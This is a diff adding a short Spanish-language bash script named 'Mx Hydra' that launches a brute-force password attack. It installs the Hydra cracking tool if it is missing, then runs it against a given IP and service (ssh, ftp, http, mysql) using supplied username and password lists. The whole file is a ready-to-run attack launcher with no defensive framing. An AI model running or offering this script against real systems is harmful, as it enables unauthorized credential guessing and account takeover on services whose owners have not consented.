@@ -1,0 +1,31 @@
+#!/bin/bash
+# ==============================================
+# Mx Hydra - Ataque de fuerza bruta
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+echo -e "${RED}"
+echo "╔══════════════════════════════════════════════╗"
+echo "║         Mx Hydra - Fuerza Bruta             ║"
+echo "╚══════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+if ! command -v hydra &> /dev/null; then
+    echo -e "${RED}[!] Hydra no instalado${NC}"
+    echo -e "${YELLOW}[!] Instalando...${NC}"
+    sudo apt install -y hydra
+fi
+
+if [ $# -lt 4 ]; then
+    echo -e "${YELLOW}[!] Uso: mx-hydra <IP> <servicio> <userlist> <passlist>${NC}"
+    echo -e "${YELLOW}[!] Ejemplo: mx-hydra 192.168.1.1 ssh users.txt passwords.txt${NC}"
+    echo -e "${YELLOW}[!] Servicios: ssh, ftp, http, mysql, etc.${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}[+] Iniciando ataque a $1 en $2...${NC}"
+hydra -L "$3" -P "$4" "$1" "$2"
